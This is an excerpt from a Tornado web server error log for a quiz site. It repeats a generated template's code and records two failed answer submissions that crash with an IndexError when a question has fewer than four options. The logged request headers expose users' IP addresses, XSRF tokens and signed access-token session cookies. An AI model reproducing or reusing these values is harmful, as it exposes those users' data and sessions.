 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c71cb8e4c854802b2dbd0&answers=%5B3%5D&cursor=14&_xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '84.9.121.159', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFHRVIxeldLSVB3Yml6OUh2N2xxSXFoZWxLTnJHV0hJU1ZCUzl1aUNaQm1OSFFCcmtnRHZKODVaQkNQV0h6bERrbUo1a2Y2WE9LV01rNFpCWkNaQ3NSeDBxdUNkazJnWkRaRA==|1348235303|d679657a3903ec4fe6bc677a3fff48f388a4426f"; _xsrf=a9a493ca6afd411489ccdc9f4d4ca8c8; __utma=188782963.305177804.1348235222.1348235222.1348235222.1; __utmb=188782963.5.10.1348235222; __utmc=188782963; __utmz=188782963.1348235222.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 77.02ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505c81dc8e4c8548017fb434&answers=%5B0%5D&cursor=6&_xsrf=45ed7cd361544cce8deab2d9771192fc', headers={'Content-Length': '92', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Cache-Control': 'no-cache', 'X-Real-Ip': '94.169.91.254', 'Referer': 'http://www.intheory.co.uk/test/new#', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Cookie': '_xsrf=45ed7cd361544cce8deab2d9771192fc; access_token=QUFBRzZsTmNzNkdjQkFHOXE3c3JDeHVWbWZIUHNhZmloWkFaQmtCSTdhU1pBZFpBZUU0WkNaQXBhY3JpMk1FWkNUa1Z3bFFEWWJXaEZuRzc5WG82V0hZMWtxQWRjZW5BM2NMZ0ViNDNoZjhIRXdaRFpE|1348239817|53e3d3776138a3463bca29111c00251614f117cb; __utma=188782963.1379251504.1348239775.1348239775.1348239775.1; __utmb=188782963.3.10.1348239775; __utmc=188782963; __utmz=188782963.1348239775.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 100.88ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
